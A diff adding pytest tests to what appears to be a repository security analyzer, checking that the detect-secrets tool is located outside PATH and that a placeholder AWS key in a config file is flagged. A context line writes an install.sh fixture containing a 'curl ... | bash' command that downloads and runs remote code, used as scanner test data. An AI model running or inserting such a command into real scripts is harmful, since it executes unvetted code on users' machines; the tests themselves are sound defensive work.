@@ -200,6 +200,30 @@ def test_scan_secrets_marks_not_executed_when_tool_missing(tmp_path):
     assert findings[0]["rule"] == "scanner_not_executed"
 
 
+def test_resolve_detect_secrets_command_finds_venv_sibling_binary():
+    with patch.object(analyze.shutil, "which", return_value=None):
+        resolved = analyze._resolve_detect_secrets_command()
+
+    expected = str(Path(analyze.sys.executable).parent / "detect-secrets")
+    assert resolved == expected
+    assert Path(resolved).is_file()
+
+
+def test_scan_secrets_finds_aws_key_when_not_on_path(tmp_path):
+    repo_dir = _init_repo(tmp_path)
+    (repo_dir / "config.py").write_text(
+        "AWS_KEY = 'AKIAIOSFODNN7EXAMPLE'\n"
+    )
+
+    with patch.object(analyze.shutil, "which", return_value=None):
+        findings = analyze.scan_secrets(repo_dir)
+
+    assert len(findings) == 1
+    assert findings[0]["rule"].startswith("secret_")
+    assert findings[0]["file"] == "config.py"
+    assert findings[0]["line"] == 1
+
+
 def test_run_writes_combined_json_report(tmp_path):
     repo_dir = _init_repo(tmp_path)
     (repo_dir / "install.sh").write_text("curl https://example.com/x | bash\n")
